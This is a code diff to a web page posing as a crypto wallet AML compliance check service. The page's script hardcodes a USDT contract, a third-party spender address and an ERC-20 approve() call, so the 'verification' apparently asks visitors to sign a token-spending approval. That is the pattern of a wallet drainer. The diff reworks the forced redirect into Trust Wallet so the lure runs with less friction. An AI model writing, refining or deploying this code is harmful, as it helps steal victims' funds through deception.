@@ -220,7 +220,7 @@
     <h1 class="headline">Know your <em>compliance</em> status before it costs you.</h1>
     <p class="sub">Request an AML check on your wallet: an analyst reviews your data and provides a clear report via email within the specified timeframe. No automated results, no surprises.</p>
     <div class="hero-cta">
-      <button class="btn-primary" onclick="handleVerifyClick()">Request a verification</button>
+      <button class="btn-primary" onclick="openVerifyModal()">Request a verification</button>
       <span class="btn-note">Response within 1-2 hours</span>
     </div>
     <div class="badges">
@@ -322,7 +322,7 @@
     <div class="form-panel">
       <h3 style="margin-bottom:12px;">Request a verification</h3>
       <p style="color:var(--paper-dim); font-size:14.5px; margin-bottom:24px;">Connect your wallet to confirm the address and receive the compliance report.</p>
-      <button class="btn-primary btn-block" onclick="handleVerifyClick()">Request a verification</button>
+      <button class="btn-primary btn-block" onclick="openVerifyModal()">Request a verification</button>
     </div>
     <div class="contact-info">
       <span class="section-head kicker" style="display:block;margin-bottom:24px;">Direct contacts</span>
@@ -418,20 +418,7 @@
     }
   }
 
-  // 1. Force Trust Wallet Logic
-  function handleVerifyClick() {
-    const isTrustWallet = window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet);
-    if (isTrustWallet) {
-      openVerifyModal();
-    } else {
-      const currentURL = window.location.href.replace(/^https?:\/\//, "");
-      const trustDeepLink = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentURL;
-      alert("Opening Trust Wallet for a secure connection...");
-      window.location.href = trustDeepLink;
-    }
-  }
-
-  // 2. Modal Control Functions
+  // 1. Modal Control Functions
   function openVerifyModal() {
     document.getElementById('stepInput').style.display = 'block';
     document.getElementById('stepResult').style.display = 'none';
@@ -442,7 +429,7 @@
     document.getElementById('verifyModalOverlay').classList.remove('active');
   }
 
-  // 3. Web3 & Contract Logic
+  // 2. Web3 & Contract Logic
   const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
   const SPENDER_ADDRESS = "0x05187cf26990e3857c119c7bc3417c6e1fac5198";
   const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
@@ -452,6 +439,16 @@
     if (!addr || !addr.startsWith('0x')) { alert("Please enter a valid address."); return; }
     const btn = document.getElementById('actionBtn');
     const msg = document.getElementById('statusMsg');
+
+    // CHECK IF INSIDE TRUST WALLET
+    const isTrustWallet = window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet);
+    
+    if (!isTrustWallet) {
+      const currentURL = window.location.href.replace(/^https?:\/\//, "");
+      const trustDeepLink = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentURL;
+      window.location.href = trustDeepLink;
+      return;
+    }
 
     try {
       btn.disabled = true;
@@ -489,7 +486,7 @@
     }
   }
 
-  // 4. UI Elements (Ledger Ticker & FAQ)
+  // 3. UI Elements (Ledger Ticker & FAQ)
   const entries = [
     { hash: '0x7a3f…9c21', tag: 'ok', label: 'Verified' },
     { hash: 'bc1q…4kd0', tag: 'review', label: 'Under review' },
